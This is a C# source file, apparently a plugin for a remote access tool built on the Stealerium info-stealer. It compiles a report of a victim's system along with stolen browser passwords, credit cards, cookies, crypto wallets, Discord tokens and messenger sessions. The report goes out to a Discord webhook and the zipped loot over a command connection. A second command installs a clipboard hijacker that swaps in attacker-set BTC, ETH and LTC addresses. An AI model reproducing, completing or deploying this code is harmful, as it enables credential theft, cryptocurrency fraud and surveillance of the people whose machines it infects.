using MessagePackLib.MessagePack;
using Stealerium;
using Stealerium.Helpers;
using Stealerium.Modules;
using Stealerium.Modules.Implant;
using Stealerium.Target.System;
using System;
using System.IO;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        public static string GetSystemInfo(string url)
        {
            // Get info
            var info = "```"
                       + "\n😹 *Stealerium - Report:*"
                       + "\nDate: " + SystemInfo.Datenow
                       + "\nSystem: " + SystemInfo.GetSystemVersion()
                       + "\nUsername: " + SystemInfo.Username
                       + "\nCompName: " + SystemInfo.Compname
                       + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split('-')[1]) + " " + SystemInfo.Culture
                       + "\nAntivirus: " + SystemInfo.GetAntivirus()
                       + "\n"
                       + "\n💻 *Hardware:*"
                       + "\nCPU: " + SystemInfo.GetCpuName()
                       + "\nGPU: " + SystemInfo.GetGpuName()
                       + "\nRAM: " + SystemInfo.GetRamAmount()
                       + "\nPower: " + SystemInfo.GetBattery()
                       + "\nScreen: " + SystemInfo.ScreenMetrics()
                       + "\nWebcams count: " + WebcamScreenshot.GetConnectedCamerasCount()
                       + "\n"
                       + "\n📡 *Network:* "
                       + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                       + "\nInternal IP: " + SystemInfo.GetLocalIp()
                       + "\nExternal IP: " + SystemInfo.GetPublicIp()
                       + "\n" + SystemInfo.GetLocation()
                       + "\n"
                       + "\n💸 *Domains info:*"
                       + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
                       + Counter.GetLValue("💰 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-')
                       + Counter.GetLValue("🎨 *Social networks*", Counter.DetectedSocialServices, '-')
                       + Counter.GetLValue("🍓 *Porn websites*", Counter.DetectedPornServices, '-')
                       + "\n"
                       + "\n🌐 *Browsers:*"
                       + Counter.GetIValue("🔑 Passwords", Counter.Passwords)
                       + Counter.GetIValue("💳 CreditCards", Counter.CreditCards)
                       + Counter.GetIValue("🍪 Cookies", Counter.Cookies)
                       + Counter.GetIValue("📂 AutoFill", Counter.AutoFill)
                       + Counter.GetIValue("⏳ History", Counter.History)
                       + Counter.GetIValue("🔖 Bookmarks", Counter.Bookmarks)
                       + Counter.GetIValue("📦 Downloads", Counter.Downloads)
                       + Counter.GetIValue("💰 Wallet Extensions", Counter.BrowserWallets)
                       + "\n"
                       + "\n🗃 *Software:*"
                       + Counter.GetIValue("💰 Wallets", Counter.Wallets)
                       + Counter.GetIValue("📡 FTP hosts", Counter.FtpHosts)
                       + Counter.GetIValue("🔌 VPN accounts", Counter.Vpn)
                       + Counter.GetIValue("🦢 Pidgin accounts", Counter.Pidgin)
                       + Counter.GetSValue("📫 Outlook accounts", Counter.Outlook)
                       + Counter.GetSValue("✈️ Telegram sessions", Counter.Telegram)
                       + Counter.GetSValue("☁️ Skype session", Counter.Skype)
                       + Counter.GetSValue("👾 Discord token", Counter.Discord)
                       + Counter.GetSValue("💬 Element session", Counter.Element)
                       + Counter.GetSValue("💭 Signal session", Counter.Signal)
                       + Counter.GetSValue("🔓 Tox session", Counter.Tox)
                       + Counter.GetSValue("🎮 Steam session", Counter.Steam)
                       + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
                       + Counter.GetSValue("🎮 BattleNET session", Counter.BattleNet)
                       + "\n"
                       + "\n🧭 *Device:*"
                       + Counter.GetSValue("🗝 Windows product key", Counter.ProductKey)
                       + Counter.GetIValue("🛰 Wifi networks", Counter.SavedWifiNetworks)
                       + Counter.GetSValue("📸 Webcam screenshot", Counter.WebcamScreenshot)
                       + Counter.GetSValue("🌃 Desktop screenshot", Counter.DesktopScreenshot)
                       + "\n"
                       + "\n🦠 *Installation:*"
                       + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices),
                           "✅ Startup installed", "⛔️ Startup disabled")
                       + Counter.GetBValue(
                           Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1",
                           "✅ Clipper installed", "⛔️ Clipper not installed")
                       + Counter.GetBValue(
                           Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1",
                           "✅ Keylogger installed", "⛔️ Keylogger not installed")
                       + "\n"
                       + "\n📄 *File Grabber:*" +
                       (Config.GrabberModule != "1" ? "\n   ∟ ⛔️ Disabled in configuration" : "")
                       + Counter.GetIValue("📂 Images", Counter.GrabberImages)
                       + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                       + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
                       + Counter.GetIValue("📂 Source code files", Counter.GrabberSourceCodes)
                       + "\n"
                       + $"\n🔗 [Archive download link]({url})"
                       + "\n🔐 Archive password is: \"" + StringsCrypt.ArchivePassword + "\""
                       + "```";

            return info;
        }
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);

                string tp = unpack_msgpack.ForcePathObject("Pac_ket").AsString;
                string discordurl = unpack_msgpack.ForcePathObject("discordurl").AsString;
                Logging.Log($"Reading Packet! {discordurl}>>\n");
                switch (tp)
                {
                    case "report":
                        {
                            //creating report dir
                            string savedir = Stealerium.Target.Passwords.Save();
                            //ziping file
                            string zipfilearchive = Filemanager.CreateArchive(savedir, false);
                            /*
                            //uploadng file to gofile service
                            Logging.Log($"Uploading Fetch Result Zip File to GoFile Service >> Started!");
                            string url = GofileFileService.UploadFile(zipfilearchive);
                            Logging.Log($"Uploading Fetch Result Zip File to GoFile Service >> Ended\n{url}!");
                            */
                            string info = GetSystemInfo("");
                            Logging.Log($"Sending Report To Discord >> Started! \n({discordurl}) ");
                            Config.Webhook = discordurl;
                            DiscordWebHook.SendReport(info);
                            Logging.Log("Sending Report To Discord >> Ended!");

                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                            msgpack.ForcePathObject("Pac_ket").AsString = "stealer";

                            msgpack.ForcePathObject("info").AsString = info;
                            msgpack.ForcePathObject("zip").SetAsBytes(File.ReadAllBytes(zipfilearchive));
                            Connection.Send(msgpack.Encode2Bytes());

                            File.Delete(zipfilearchive);
                            break;
                        }
                    case "clipper":
                        {
                            Config.ClipperAddresses["btc"] = unpack_msgpack.ForcePathObject("btc").AsString;
                            Config.ClipperAddresses["eth"] = unpack_msgpack.ForcePathObject("eth").AsString;
                            Config.ClipperAddresses["ltc"] = unpack_msgpack.ForcePathObject("ltc").AsString;

                            Thread wThread = WindowManager.MainThread;
                            wThread.SetApartmentState(ApartmentState.STA);
                            wThread.Start();
                            // Run clipper module
                            Thread cThread = ClipboardManager.MainThread;
                            cThread.SetApartmentState(ApartmentState.STA);
                            cThread.Start();
                            
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                            msgpack.ForcePathObject("Pac_ket").AsString = "clipper";
                            Connection.Send(msgpack.Encode2Bytes());

                            // Wait threads
                            if (wThread != null)
                                if (wThread.IsAlive) wThread.Join();
                            if (wThread != null)
                                if (cThread != null && cThread.IsAlive) cThread.Join();
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"{ex.Message}\n {ex.StackTrace} \n{ex.Source}");
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}